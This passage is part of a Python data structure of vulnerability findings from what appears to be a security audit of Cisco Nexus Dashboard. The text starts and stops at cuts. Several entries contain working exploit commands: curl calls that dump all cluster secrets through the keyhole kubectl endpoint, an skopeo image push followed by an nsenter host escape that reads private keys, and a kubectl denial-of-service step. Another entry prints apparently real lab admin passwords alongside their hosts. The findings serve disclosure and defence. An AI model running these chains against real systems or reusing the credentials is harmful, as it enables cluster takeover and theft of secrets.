            "mTLS client certs are issued by the ND cluster CA managed by KMS etcd (ND-F03). "
            "Via ND-F03 (etcd KMS CVE-2021-28235) -> extract all private keys -> forge valid ND client cert "
            "-> present to dgraph-alpha-public:8080 -> unrestricted GraphQL schema enumeration, "
            "data reads, and mutations. Dgraph without ACL tokens has no application-layer "
            "authorization beyond TLS — any valid mTLS client can query or mutate all predicates."
        ),
        "service": "dgraph-alpha-public.cisco-nir.svc",
        "ports": {"http_graphql": 8080, "grpc": 9080},
        "image": "telemetry/dgraph:6.5.2.56",
        "startup_args": ["start"],
        "missing_flags": ["--security whitelist=<ip>", "--acl_secret_file=<path>"],
        "mtls_required": True,
        "mtls_bypass": "ND-F03 -> extract ND CA key from KMS etcd -> issue client cert matching ND CA",
        "chain": "ND-F03 etcd KMS -> extract CA key -> forge mTLS client cert -> dgraph-alpha-public:8080 -> full NIR graph DB access",
        "data_at_risk": "NIR telemetry graph: topology, flow analysis, security policy, device inventory",
    },
    "ND-F35": {
        "title": "ND_INFRA_ACCESS_TOKEN Filesystem Path Exposed via NDFC ConfigMap — ND Core API Token Readable from NDFC Pods",
        "severity": "HIGH",
        "component": "cisco-ndfc configmap (cisco-dcnm-configmap.yml), all NDFC pods",
        "description": (
            "The NDFC ConfigMap cisco-dcnm sets ND_INFRA_ACCESS_TOKEN: "
            "'/var/run/secrets/case.cncf.io/infra-access/access.token'. "
            "This environment variable tells all NDFC services where to find the infra access token "
            "used to authenticate NDFC->ND core API calls. The token is a projected service account "
            "token mounted at that path in all NDFC pods. "
            "From any code execution in a cisco-ndfc pod (via ND-F30 chain or direct vuln), "
            "the token is readable: cat /var/run/secrets/case.cncf.io/infra-access/access.token. "
            "This token authenticates as an internal ND service principal, bypassing user-level "
            "authentication for ND core API endpoints that accept infra-access tokens. "
            "Combined with ND-F30 (cluster-admin): enumerate all NDFC pod names -> exec into any -> "
            "read infra token -> call ND core internal APIs directly."
        ),
        "env_var": "ND_INFRA_ACCESS_TOKEN",
        "token_path": "/var/run/secrets/case.cncf.io/infra-access/access.token",
        "token_type": "projected ServiceAccount token (case.cncf.io/infra-access audience)",
        "also_exposed": "NDFC_NXCLOUD_USERNAME: ndfc-svc-nxcloud (cloud connector service identity)",
        "chain": "Code exec in cisco-ndfc pod -> cat /var/run/secrets/case.cncf.io/infra-access/access.token -> call ND core infra APIs as NDFC service principal",
        "combined_with": ["ND-F30", "ND-F29"],
    },
    "ND-F36": {
        "title": "kubese-admission-webhook failurePolicy:Fail on All K8s Resource Types — Cluster-Wide Creation DoS",
        "severity": "MEDIUM",
        "component": "nd-core-infra helm (webhook.tpl), MutatingWebhookConfiguration kubese-admission-webhook",
        "description": (
            "The MutatingWebhookConfiguration 'kubese-admission-webhook' registers four webhooks "
            "against kube-admission.kube-system.svc, all with failurePolicy: Fail. "
            "Covered resources: namespaces + pods + podsecuritypolicies (CREATE/UPDATE), "
            "persistentvolumeclaims (CREATE/UPDATE), deployments + statefulsets + replicasets + jobs "
            "(CREATE/UPDATE), storageclasses (CREATE/UPDATE). "
            "With failurePolicy: Fail, any webhook call that cannot reach the backend service "
            "causes the API server to REJECT the resource operation. "
            "If kube-admission.kube-system.svc is made unreachable (pod killed, service deleted, "
            "or CrashLoopBackOff induced), ALL create/update operations for the above resource types "
            "fail cluster-wide. No new pods, deployments, PVCs, or namespaces can be created. "
            "An attacker with cluster-admin (ND-F30) can delete the kube-admission pod to trigger "
            "a cluster-wide resource creation freeze."
        ),
        "webhook_name": "kubese-admission-webhook",
        "backend_service": "kube-admission.kube-system.svc",
        "failure_policy": "Fail",
        "affected_resources": [
            "namespaces, pods, podsecuritypolicies (CREATE, UPDATE)",
            "persistentvolumeclaims (CREATE, UPDATE)",
            "deployments, statefulsets, replicasets, jobs (CREATE, UPDATE)",
            "storageclasses (CREATE, UPDATE)",
        ],
        "dos_path": (
            "kubectl --token=<cluster-admin-token> delete pod "
            "-n kube-system -l k8s-app=kubese-admission "
            "-> kube-admission unreachable -> all resource creation/update rejected"
        ),
        "combined_with": ["ND-F30"],
    },
    "ND-F37": {
        "title": "CockroachDB Backup Service Client Cert SAN 'root' — Root-Level Database Access for Backup Operations",
        "severity": "MEDIUM",
        "component": "cockroachdb helm (cockroachdb.tpl), cockroachdb-backup client cert, *.cockroachdb-lcl node wildcard SAN",
        "description": (
            "CockroachDB TLS client authentication maps the certificate CN or SAN to a database user. "
            "The cockroachdb-backup client cert has CN: backup, SAN dnsnames: ['root']. "
            "In CockroachDB, presenting client.backup.crt with SAN 'root' authenticates as the 'root' "
            "database user — the built-in superuser with full DDL and DML access, no row-level security. "
            "The cockroachdb-rootuser cert similarly has SAN 'root', granting root DB access. "
            "Additionally, the CockroachDB node cert has SAN dnsnames: ['*.cockroachdb-lcl'], "
            "a wildcard that allows any service presenting a cert matching this SAN to impersonate "
            "a CockroachDB cluster node — enabling Raft log injection or cluster metadata manipulation. "
            "Via ND-F03 (KMS etcd auth bypass) -> extract cockroachdb client cert private keys -> "
            "connect to CockroachDB port 26257 as root -> full NDFC database access "
            "(device inventory, fabric configs, credentials, user accounts)."
        ),
        "certs": {
            "cockroachdb-backup": {
                "cn": "backup",
                "san_dnsnames": ["root"],
                "files": {"cert": "client.bkpuser.crt", "key": "client.bkpuser.key"},
                "effective_db_user": "root",
            },
            "cockroachdb-rootuser": {
                "cn": "root",
                "san_dnsnames": ["root"],
                "files": {"cert": "client.root.crt", "key": "client.root.key"},
                "effective_db_user": "root",
            },
            "node_cert": {
                "san_dnsnames": ["localhost", "*.cockroachdb-lcl", "{{getAppInstanceService}}", "{{getAppInstanceService}}-lb"],
                "wildcard_scope": "any hostname matching *.cockroachdb-lcl can impersonate a CockroachDB node",
            },
        },
        "ports": {"sql_wire": 26257, "admin_http": 8088},
        "chain": "ND-F03 etcd KMS -> extract client.root.key -> cockroach sql --certs-dir=. --host=cockroachdb.cisco-ndfc.svc:26257 -> full NDFC DB",
        "combined_with": ["ND-F03", "ND-F30"],
    },
    "ND-F38": {
        "title": "nodemgr Node Registration Endpoint authType:open — Unauthenticated ND Cluster Node Join",
        "severity": "HIGH",
        "component": "config-controller / nodemgr APIGW (nodemgr.tpl), nodectrlr-svc:8990 /api/action/v0/nodes/register",
        "description": (
            "The nodemgr APIGW configuration exposes /api/config/registernode with authType: open, "
            "routing to nodectrlr-svc:8990/api/action/v0/nodes/register (HTTP, not HTTPS). "
            "Node registration is the mechanism by which new ND cluster members are added. "
            "The DenyAppUserRole middleware blocks application users, but authType: open means "
            "no JWT or session token is required — the endpoint accepts unauthenticated requests. "
            "The sibling endpoints for node RMA and failover both use authType: jwt, making "
            "the open registration anomalous rather than intentional. "
            "An attacker with APIGW network access can submit a node registration request for "
            "an attacker-controlled host, potentially injecting a rogue ND node into the cluster "
            "that would then receive cluster sync data, etcd peer connections, and KMS certificate material."
        ),
        "apigw_listen_path": "/api/config/registernode",
        "backend": "http://nodectrlr-svc:8990/api/action/v0/nodes/register",
        "auth_type": "open",
        "sibling_endpoints": {
            "/api/config/rmanode": "authType: jwt",
            "/api/config/failovernode": "authType: jwt",
        },
        "impact": "Rogue node injection into ND cluster -> receive cluster sync, etcd peering, KMS cert material",
        "chain": "POST /api/config/registernode (no auth) -> nodectrlr registers attacker host -> cluster sync to rogue node",
    },
    "ND-F39": {
        "title": "securitymgr KMS CA Endpoint authType:open — Cluster CA Configuration Readable Without Authentication",
        "severity": "HIGH",
        "component": "securitymgr APIGW (securitymgr.yml), securitymgr-svc:8989 /api/config/ca",
        "description": (
            "The securitymgr APIGW exposes /sedgeapi/v1/kms/ca/ with authType: open, "
            "routing to securitymgr-svc:8989/api/config/ca over HTTPS. "
            "This endpoint exposes the ND KMS CA configuration — certificate chain details, "
            "CA identity, and potentially CA operational parameters. "
            "The securitymgr service manages the cluster's PKI root (KMS CA) and is the same "
            "service that exposes the passphrase debug endpoint (ND-F17) and credential store dump (ND-F18). "
            "Without authentication, any host that can reach the APIGW can GET /sedgeapi/v1/kms/ca/ "
            "to enumerate the cluster CA configuration. "
            "If the endpoint accepts POST/PUT (CA injection), an attacker could add a rogue CA "
            "to the trust store without authentication, enabling MITM against all mTLS connections."
        ),
        "apigw_listen_path": "/sedgeapi/v1/kms/ca/",
        "backend": "https://securitymgr-svc:8989/api/config/ca",
        "auth_type": "open",
        "impact": "CA config read (cert chain, CA identity); potential CA injection if endpoint is writable",
        "combined_with": ["ND-F17", "ND-F18", "ND-F03"],
        "chain": "GET /sedgeapi/v1/kms/ca/ (no auth) -> cluster CA chain enumeration -> pivot to ND-F17 passphrase dump",
    },
    "ND-F42": {
        "title": "K8s API Server Static Token Auth File on Host Filesystem — apigw Reads Token from hostPath Mount",
        "severity": "HIGH",
        "component": "apigw pod (apigw.tpl) + kube-apiserver (kube-apiserver.tpl), staging hostPath /data/services/k8_secure/staging/",
        "description": (
            "The K8s API server is configured with --token-auth-file={{staging}}/known_tokens.csv, "
            "enabling static bearer token authentication. "
            "The apigw pod mounts the staging directory as a hostPath volume (name: srvrun) "
            "at the same path inside the container (mountPath: {{staging}}). "
            "The apigw postStart lifecycle hook reads the first token from known_tokens.csv and writes "
            "it to /var/run/secrets/kubernetes.io/serviceaccount/token — making the apigw pod "
            "use a static K8s bearer token rather than a projected service account token. "
            "Static token auth has two security implications: "
            "(1) Tokens never expire unless manually rotated — a compromised token is permanently valid. "
            "(2) The token file is readable from any process with access to the staging hostPath, "
            "including any pod with a ND-F01 techsupport bundle read or any container with hostPath "
            "access to /data/services/k8_secure/staging/. "
            "The CSV format is: <token>,<user>,<uid>,<groups> — all entries are exposed if the file is read."
        ),
        "staging_path": "/data/services/k8_secure/staging/ (hostPath, same inside container)",
        "token_file": "known_tokens.csv",
        "token_format": "<token>,<username>,<uid>,\"<group1>,<group2>\"",
        "k8s_apiserver_flag": "--token-auth-file={{staging}}/known_tokens.csv",
        "apigw_poststart": (
            "IFS=',' read -ra TOKEN <<< $(< /data/services/k8_secure/staging/known_tokens.csv) "
            "&& echo $TOKEN > /var/run/secrets/kubernetes.io/serviceaccount/token"
        ),
        "impact": "Static K8s bearer token never expires; all tokens in CSV exposed to staging-path readers",
        "chain": "Node/container access -> read /data/services/k8_secure/staging/known_tokens.csv -> static K8s bearer token -> k8s API as whatever user is in the CSV",
        "combined_with": ["ND-F01", "ND-F30"],
    },
    "ND-F43": {
        "title": "Keyhole /kubectl Endpoint — Arbitrary kubectl with rescue-user Cluster-Admin Kubeconfig",
        "severity": "CRITICAL",
        "component": "keyhole_server.py do_kubectl(), /home/rescue-user/.kube/config",
        "description": (
            "The /keyhole/api/v1/kubectl endpoint takes a user-controlled args query parameter, "
            "URL-decodes it, splits on space, and executes kubectl with the result appended to "
            "--kubeconfig /home/rescue-user/.kube/config. "
            "rescue-user is the K8s disaster recovery account; its kubeconfig is expected to have "
            "cluster-admin equivalent privileges for node-level cluster recovery operations. "
            "Source (keyhole_server.py do_kubectl()): "
            "quoted_args = flask.request.args.get('args'); "
            "args = urllib.parse.unquote(quoted_args).split(' '); "
            "# if '--' in args: insert --kubeconfig RESCUE_USER_CONFIG before '--'; else append; "
            "return _run_streaming(passwd.KUBECTL_PATH, args) "
            "No argument validation — attacker can specify any kubectl subcommand: "
            "get secrets -A (dump all secrets cluster-wide), "
            "exec (container exec if exec permission exists), "
            "delete (destroy resources). "
            "_run_streaming() uses shell=False, preventing shell injection, but full kubectl API access remains. "
            "Additional: attacker can inject --kubeconfig /attacker/path before -- separator "
            "to override the rescue-user kubeconfig with an attacker-controlled one."
        ),
        "endpoint": "GET /keyhole/api/v1/kubectl?args=<kubectl_args>&cookie=<cookie>",
        "kubeconfig": "/home/rescue-user/.kube/config",
        "exploit": (
            "COOKIE=$(cat /var/run/admin.cookie)\n"
            "# dump all cluster secrets\n"
            "curl 'http://localhost:30020/keyhole/api/v1/kubectl?args=get%20secrets%20-A%20-o%20json&cookie='$COOKIE\n"
            "# exec into pod\n"
            "curl 'http://localhost:30020/keyhole/api/v1/kubectl?args=exec%20-n%20kube-system%20<pod>%20--%20id&cookie='$COOKIE"
        ),
        "impact": "Arbitrary kubectl with cluster-admin equivalent = full K8s cluster takeover",
        "chain": "ND-F01 (read /var/run/admin.cookie) -> GET /keyhole/api/v1/kubectl?args=get%20secrets%20-A -> cluster-admin",
        "combined_with": ["ND-F01", "ND-F30"],
    },
    "ND-F44": {
        "title": "Keyhole Server Plain HTTP — Cookie and Credentials Transmitted Unencrypted on Port 30020",
        "severity": "HIGH",
        "component": "keyhole_server.py startup: app.run(port=30020, threaded=True)",
        "description": (
            "The keyhole Flask server starts with app.run(port=30020, threaded=True) — no ssl_context "
            "parameter. All traffic including the authentication cookie (URL query param ?cookie=<val>) "
            "and all command output (kubectl results, passphrase values, cluster config) "
            "is transmitted in cleartext HTTP. "
            "Any network path observer between the calling client and the keyhole service can "
            "capture the cookie passively, then replay it for full keyhole API access. "
            "In an ND cluster, intra-node management traffic traverses the same network fabric as "
            "cluster control plane traffic — passive sniffing requires only a position on the "
            "management VLAN or the ability to capture on a shared interface. "
            "The cookie is in the HTTP request line (URL query param) — visible in proxy logs, "
            "tcpdump, and any HTTP-aware logging on the path."
        ),
        "port": 30020,
        "protocol": "HTTP (no TLS)",
        "auth_vector": "URL query param ?cookie=<val> transmitted in cleartext request line",
        "impact": "Passive cookie capture from management network position -> full keyhole API access",
        "chain": "Network sniff /keyhole/api/v1/* request -> extract ?cookie= value -> replay for cluster-admin kubectl (ND-F43)",
        "combined_with": ["ND-F01", "ND-F43"],
    },
    "ND-F45": {
        "title": "Keyhole Multi-Endpoint Argument Injection — filepath/peer_password/stage/node Unsanitized to subprocess",
        "severity": "HIGH",
        "component": "keyhole_server.py upgrade_update(), upgrade_recover(), failover(), rma(), nodejoin()",
        "description": (
            "Five keyhole endpoints construct subprocess commands by directly interpolating "
            "user-controlled query parameters via Python f-strings, then splitting on whitespace "
            "(subprocess.Popen(str(arg).split(), ...)) — no shell=True, but whitespace in params "
            "injects extra arguments to the target binary. "
            "1. /upgrade/update: f'{UPDATE} {filepath} admin {peer_password}' — "
            "   spaces in filepath or peer_password inject flags to upgrade-helper firmware-update. "
            "   peer_password hidden from logging (showCmd=False) but not from injection. "
            "2. /upgrade/recover: f'{RECOVER} {stage}' — stage param injects flags to upgrade-helper recover. "
            "3. /failover: f'recover failover --failedNode {failedNode} --standbyNode {standbyNode}' — "
            "   both params injected to recover binary. "
            "4. /rma: controllerIP + controllerUser + failedNode injected to recover rma. "
            "5. /nodejoin: passphrase passed as argv[1] to se-join.py — visible in /proc/<pid>/cmdline "
            "   to any local process during the window se-join.py executes."
        ),
        "endpoints": {
            "/keyhole/api/v1/upgrade/update": "filepath + peer_password -> upgrade-helper firmware-update",
            "/keyhole/api/v1/upgrade/recover": "stage -> upgrade-helper recover",
            "/keyhole/api/v1/failover": "failedNode + standbyNode -> recover failover",
            "/keyhole/api/v1/rma": "controllerIP + controllerUser + controllerPassword -> recover rma",
            "/keyhole/api/v1/nodejoin": "passphrase -> se-join.py argv[1] (process list visible)",
        },
        "injection_mechanism": "f-string whitespace splitting -> extra flags to target binaries; no shell injection",
        "impact": "Argument injection to upgrade-helper/recover binaries; passphrase process list disclosure",
        "chain": "ND-F01 cookie -> /upgrade/update?filepath=/fw%20--extra-flag -> injected argument to upgrade-helper",
        "combined_with": ["ND-F01"],
    },
    "ND-F46": {
        "title": "Keyhole /ping and /nslookup — Unrestricted Internal Network Probing from ND Node Position",
        "severity": "MEDIUM",
        "component": "keyhole_server.py do_ping(), do_nslookup(), /keyhole/api/v1/ping + /nslookup",
        "description": (
            "The /keyhole/api/v1/ping endpoint URL-decodes and splits user-supplied args, "
            "then passes them directly to the ping binary with no argument filtering: "
            "args = urllib.parse.unquote(quoted_args).split(' '); _run_streaming('ping', args). "
            "This enables an authenticated keyhole caller to probe any IP address for reachability "
            "from the ND node network position — ICMP from the fabric management network. "
            "The ND node has direct reach to: Nexus switch management interfaces, OOB management "
            "subnets, adjacent data center segments, and OT/ICS networks in fabric deployments. "
            "The /nslookup endpoint similarly passes args to nslookup run as nobody — "
            "DNS-based internal enumeration from the ND node resolver position. "
            "Combined with ND-F01 (world-readable cookie), both endpoints are accessible to any "
            "local process or pod with /var/run/ hostPath mount."
        ),
        "endpoints": {
            "/keyhole/api/v1/ping": "ping with user args (no filter) — ICMP from ND mgmt network",
            "/keyhole/api/v1/nslookup": "nslookup as nobody with user args — DNS from ND resolver",
        },
        "pivot_reach": "Nexus switch mgmt, OOB mgmt subnets, fabric-adjacent segments, OT/ICS networks",
        "impact": "Internal network reachability mapping from ND fabric node position",
        "chain": "ND-F01 cookie -> GET /keyhole/api/v1/ping?args=-c1%20<internal_target> -> ICMP probe from ND node",
        "combined_with": ["ND-F01"],
    },
    "ND-F47": {
        "title": "sm-psp-infra ClusterRole — Near-Cluster-Admin RBAC on Site Manager Namespace",
        "severity": "CRITICAL",
        "component": "site-manager namespace (sm.tpl), ClusterRole sm-psp-infra, ClusterRoleBinding sm-infra-binding",
        "description": (
            "The site-manager deployment defines ClusterRole sm-psp-infra with "
            "apiGroups:['*'], resources:['*'], verbs:['get','watch','list','create','update','patch','delete']. "
            "This is effectively cluster-admin — all resource types, all API groups, all write verbs "
            "except 'impersonate' and 'use'. The ClusterRoleBinding sm-infra-binding grants this role "
            "to system:serviceaccounts:sm — every pod in the sm namespace. "
            "The site-manager pod additionally mounts: "
            "(1) issh-token PVC — SSH infrastructure credentials "
            "(2) hostPath /certs/ssl — node SSL certificates "
            "(3) hostPath /etc/cisco-certs — cluster CA bundle "
            "(4) KMS certs via PVC "
            "This is the fourth wildcard ClusterRole found in ND 3.2.2m (after appmgr/eventmonitoring/firmwared). "
            "Site-manager handles multi-site APIC controller credentials — code exec in sm namespace = "
            "cluster-admin + access to all connected ACI APIC credentials."
        ),
        "clusterrole_rules": [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["get","watch","list","create","update","patch","delete"]}],
        "binding_subjects": ["system:serviceaccounts:sm"],
        "additional_mounts": ["issh-token PVC", "hostPath /certs/ssl", "hostPath /etc/cisco-certs", "kms PVC"],
        "chain": "Code exec in sm namespace -> sm-psp-infra ClusterRole = near-cluster-admin; OR: ND-F01 cookie -> ND-F43 kubectl -> exec sm pod",
        "combined_with": ["ND-F30", "ND-F40", "ND-F41"],
    },
    "ND-F48": {
        "title": "Hardcoded Cisco Internal Lab Credentials in Shipped API Documentation — APIC Admin + ND Federation Admin",
        "severity": "HIGH",
        "component": "site-manager Helm API docs (federation-management.tpl + site-management.tpl)",
        "description": (
            "Two sets of real Cisco internal lab credentials are embedded as example request bodies "
            "in the site-manager API documentation templates that ship in production firmware. "
            "1. ND Federation member onboarding example (federation-management.tpl): "
            "   host: 172.20.43.53, userName: 'admin', password: 'ins3965!' (base64: aW5zMzk2NSE=) "
            "   Federation member status example includes: host 172.20.43.54, serial A8453219BDF2, "
            "   name 'ins15-dev-ova52' (internal Cisco ND dev instance). "
            "2. ACI APIC site onboarding example (site-management.tpl): "
            "   host: 10.195.219.153:443, siteType: ACI, userName: 'admin', password: 'Ciscoins3965!' "
            "   (base64: Q2lzY29pbnMzOTY1IQ==), siteName: 'sanity1'. "
            "Both credentials follow the pattern: <product>ins<4digits>! — consistent with Cisco "
            "internal test/sanity password convention. "
            "The ACI APIC admin credential (Ciscoins3965!) is for a real Cisco APIC at 10.195.219.153 "
            "used in ND sanity testing. "
            "These credentials are accessible to any attacker who extracts the firmware and reads the "
            "API documentation templates — no runtime execution needed. "
            "Risk: if the same password pattern is reused in production deployments or other Cisco "
            "test environments, credential stuffing is trivial."
        ),
        "credentials": {
            "nd_federation": {
                "host": "172.20.43.53",
                "username": "admin",
                "password": "ins3965!",
                "base64": "aW5zMzk2NSE=",
                "context": "ND federation member onboarding example",
                "instance_name": "ins15-dev-ova5/ins15-dev-ova52",
            },
            "aci_apic": {
                "host": "10.195.219.153:443",
                "username": "admin",
                "password": "Ciscoins3965!",
                "base64": "Q2lzY29pbnMzOTY1IQ==",
                "context": "ACI APIC site onboarding example (siteType=ACI, name=sanity1)",
            },
        },
        "device_serial": "A8453219BDF2 (Cisco ND node serial from federation status example)",
        "password_pattern": "<product>ins<4digits>! — consistent across both credentials; likely Cisco CI/CD test convention",
        "impact": (
            "Credential stuffing against Cisco ND and APIC deployments using pattern <x>ins<N>!; "
            "ACI APIC admin access if 10.195.219.153 is reachable and credential not rotated; "
            "reveals internal Cisco test infrastructure topology"
        ),
        "chain": "Read site-manager federation-management.tpl from firmware -> base64 decode -> try admin:ins3965! on ND instances and admin:Ciscoins3965! on ACI APICs",
        "combined_with": ["ND-F18", "ND-F31"],
    },
    "ND-F50": {
        "title": "spm Pod — privileged:true + hostNetwork + Root Kubeconfig + Full KMS/OCI/k8_secure hostPath Access",
        "severity": "CRITICAL",
        "component": "spm Pod in kube-system (spm.tpl), /bin/spm.bin, priorityClassName: system-cluster-critical",
        "description": (
            "The Service Package Manager (spm) runs as a static K8s Pod in kube-system with the most "
            "dangerous security configuration observed in ND 3.2.2m: "
            "securityContext.privileged: true + hostNetwork: true + root kubeconfig + 9 hostPath volumes "
            "covering the entire ND storage hierarchy. "
            "Deployment: /bin/spm.bin --kubeconfig {{staging}}/kube-config/root "
            "(where staging = /data/services/k8_secure/staging/). "
            "privileged: true = full kernel namespace access, capability escalation, device access. "
            "Combined with hostNetwork: true, any code exec in spm = immediate host root via "
            "nsenter --mount=/proc/1/ns/mnt -- /bin/bash or equivalent. "
            "hostPath mounts accessible inside container: "
            "(1) /data/services/kms_etcd → /data/services/kms_etcd: ALL cluster private keys (ND-F03) "
            "(2) /data/services/k8_secure → /data/services/k8_secure: known_tokens.csv (ND-F42) + root kubeconfig "
            "(3) /data/services/oci_repo → /data/services/oci_repo: OCI registry root (all container images) "
            "(4) /data/firmwared → /data/firmwared: all firmware images "
            "(5) /var/lib → /var/lib: container runtime state (containerd/crio overlayfs) "
            "(6) /config: full system syscfg.yaml "
            "Chain: ND-F29 Zot no-auth OCI push -> replace spm image -> container restart -> "
            "privileged pod code exec -> nsenter host escape -> full node root."
        ),
        "pod_type": "static Pod in kube-system (system-cluster-critical priority)",
        "security_context": "privileged: true",
        "network": "hostNetwork: true",
        "kubeconfig": "{{staging}}/kube-config/root = /data/services/k8_secure/staging/kube-config/root",
        "hostpath_volumes": {
            "/data/services/kms_etcd": "ALL cluster TLS private keys (ND-F03 blast radius)",
            "/data/services/k8_secure": "known_tokens.csv + root kubeconfig (ND-F42)",
            "/data/services/oci_repo": "OCI registry root — all ND service container images",
            "/data/firmwared": "all ND firmware packages",
            "/var/lib": "container runtime state (overlayfs, containerd sockets)",
            "/config": "system config (syscfg.yaml)",
            "/etc/containers": "container runtime config (read-only)",
            "/mnt/atom (subPaths)": "kubectl, spm-lcm, bootstrap binaries",
        },
        "exploit": (
            "# Via ND-F29 (Zot no-auth OCI push)\n"
            "skopeo copy --dest-tls-verify=false attacker/payload:latest oci://localhost:5000/apic-sn/spm:latest\n"
            "# Wait for spm pod restart (or kill existing spm pod via cluster-admin)\n"
            "# Inside spm container (privileged + hostNetwork):\n"
            "nsenter --mount=/proc/1/ns/mnt --net=/proc/1/ns/net -- /bin/bash\n"
            "# Now running as host root with full node access\n"
            "cat /data/services/kms_etcd/certs/v1/kubernetes/server-key.pem\n"
            "cat /data/services/k8_secure/staging/known_tokens.csv"
        ),
        "impact": (
            "Full ND cluster node root access; ALL KMS private keys readable; "
            "OCI registry manipulation; static K8s token exfil; container runtime escape. "
            "Most dangerous single pod in ND 3.2.2m."
        ),
        "chain": (
            "ND-F29 (Zot no-auth push) -> replace spm OCI image -> spm pod restart -> "
            "privileged+hostNetwork = nsenter host escape -> root on ND master node -> "
            "read /data/services/kms_etcd (all cluster keys) + known_tokens.csv + OCI image manipulation"
        ),
        "combined_with": ["ND-F29", "ND-F03", "ND-F42", "ND-F30"],
    },
    "ND-F49": {
        "title": "system:mond ClusterRole in kube-system — Near-Cluster-Admin Monitoring Daemon with Staging hostPath",
        "severity": "CRITICAL",
        "component": "mond namespace kube-system (mond.tpl), ClusterRole system:mond, ServiceAccount mond",
        "description": (
            "The monitoring daemon (mond) defines ClusterRole system:mond with "
            "apiGroups:['*'], resources:['*'], verbs:['get','watch','list','update','create','delete']. "
            "Bound to ServiceAccount mond in namespace kube-system — the most privileged namespace. "
            "kube-system SA tokens bypass most admission controls and have implicit elevated trust. "
            "mond is a Prometheus-compatible monitoring service that scrapes K8s API metrics directly. "
            "Critical hostPath mounts: "
            "(1) {{staging}} = /data/services/k8_secure/staging/ — contains known_tokens.csv (ND-F42). "
            "(2) /mnt/atom/k8/ — full K8s binary tree including kubectl. "
            "(3) {{CertDir}} and cacerts.crt — all cluster certificates. "
            "(4) /var/run/platform — platform runtime state. "
            "This is the fifth near-cluster-admin ClusterRole in ND 3.2.2m (appmgr, eventmonitoring, "
            "firmwared, sm, mond). The systemic pattern: every service that needs K8s API access "
            "receives a wildcard resource ClusterRole rather than scoped permissions. "
            "Running in kube-system with access to staging/known_tokens.csv + kubectl binary = "
            "code exec in mond pod -> read static K8s tokens + arbitrary kubectl."
        ),
        "clusterrole_rules": [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["get","watch","list","update","create","delete"]}],
        "binding_subjects": [{"kind": "ServiceAccount", "name": "mond", "namespace": "kube-system"}],
        "hostpath_mounts": [
            "{{staging}} = /data/services/k8_secure/staging/ (known_tokens.csv)",
            "/mnt/atom/k8/ (kubectl + K8s binaries)",
            "{{CertDir}} (all cluster certs)",
            "/var/run/platform (platform runtime)",
            "/logs/k8 (K8s logs)",
        ],
        "systemic_note": "5th wildcard ClusterRole found; pattern: every K8s-integrated ND service gets near-cluster-admin",
        "chain": "Code exec in mond pod -> read /data/services/k8_secure/staging/known_tokens.csv (ND-F42) -> static K8s bearer token -> cluster-admin; OR kube-system SA token -> cluster-admin",
        "combined_with": ["ND-F42", "ND-F30", "ND-F40", "ND-F41", "ND-F47"],
    },
    "ND-F40": {
        "title": "system:eventmonitoring ClusterRole — Cluster-Admin Equivalent RBAC on Event Monitoring Service",
        "severity": "CRITICAL",
        "component": "eventmonitoring namespace (eventmonitoring.tpl), ClusterRole system:eventmonitoring, ClusterRoleBinding eventmonitoring",
        "description": (
            "The eventmonitoring container defines ClusterRole system:eventmonitoring with "
            "apiGroups:['*'], resources:['*'], verbs:['*'] — identical to system:appmgr (ND-F30). "
            "The ClusterRoleBinding binds this role to system:serviceaccounts:eventmonitoring — "
            "every pod in the eventmonitoring namespace carries a cluster-admin service account token. "
            "The eventmonitoring service processes cluster event streams and has Kafka cert mounts "
            "(/kafka-certs), making it reachable via Kafka topic injection. "
            "Exploitation: code exec in any eventmonitoring pod -> SA token = cluster-admin. "
            "Distinct from ND-F30: this is the eventmonitoring namespace, not the app namespaces. "
            "Combined with ND-F23 (hardcoded Kafka JAAS credentials), an attacker can inject "
            "malformed events via Kafka -> trigger eventmonitoring processing -> code path -> "
            "extract the cluster-admin SA token."
        ),
        "clusterrole_rules": [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["*"]}],
        "binding_subjects": ["system:serviceaccounts:eventmonitoring"],
        "kafka_certs_mount": "volumeMount name=kafka-certs in eventmonitoring pod",
        "chain": "ND-F23 Kafka JAAS creds -> inject event -> eventmonitoring pod exec -> SA token = cluster-admin",
        "combined_with": ["ND-F23", "ND-F30"],
    },
    "ND-F41": {
        "title": "system:firmwared ClusterRole — Cluster-Admin Equivalent RBAC on Firmware Update Daemon",
        "severity": "CRITICAL",
        "component": "firmwared namespace DaemonSet (firmwared.tpl), ClusterRole system:firmwared, ServiceAccount firmwared",
        "description": (
            "The firmwared container defines ClusterRole system:firmwared with "
            "apiGroups:['*'], resources:['*'], verbs:['*'] bound to ServiceAccount firmwared in "
            "namespace firmwared. firmwared is a DaemonSet — it runs on EVERY node in the cluster. "
            "The pod already has known attack surface via ND-F12 (SSRF via peer:// URL parameter, "
            "dev firmware signing key). Chaining: "
            "ND-F01 (world-readable cookie) -> call acs with SSRF to reach firmwared HTTP port -> "
            "OR: any code exec in firmwared DaemonSet pod -> cluster-admin SA token. "
            "Because firmwared runs on every node as a DaemonSet, there is one firmwared pod per "
            "ND cluster node. Compromising any single firmwared pod yields cluster-admin. "
            "firmwared also mounts /data/services/kms_etcd (KMS hostPath) for cert access."
        ),
        "clusterrole_rules": [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["*"]}],
        "binding_subjects": [{"kind": "ServiceAccount", "name": "firmwared", "namespace": "firmwared"}],
        "daemonset": True,
        "nodes_covered": "all ND cluster nodes (one pod per node)",
        "additional_mounts": ["kms hostPath /data/services/kms_etcd", "firmwared volumes for firmware storage"],
        "chain": "ND-F12 peer:// SSRF -> firmwared HTTP -> trigger firmware handler -> OR direct code exec -> SA token = cluster-admin",
        "combined_with": ["ND-F12", "ND-F01", "ND-F30"],
    },

    # ─── upgrade-helper / firmware upgrade pipeline ──────────────────────────

    "ND-F51": {
        "title": "upgrade-helper Post-Activate: Atomix Binary Executed from User-Controlled ISO Mount Path",
        "severity": "CRITICAL",
        "component": "upgrade-helper post-activate/10-k8s-service-activate shell script",
        "description": (
            "The post-activate script (10-k8s-service-activate) for K8s service activation receives "
            "the firmware ISO path as $3 (third positional argument). This path flows from keyhole's "
            "firmware-update endpoint which takes 'filepath' as a URL query parameter. "
            "The script does: "
            "(1) mount -o loop $iso $cdrom (mounts attacker-controlled ISO) "
            "(2) atomixbin=$cdrom/atomix (atomix binary FROM the mounted ISO — attacker-controlled) "
            "(3) $atomixbin update $iso (executes attacker-controlled binary as root) "
            "Additionally: cp $cdrom/manifestCert.pem /config/manifestCert.pem writes attacker-controlled "
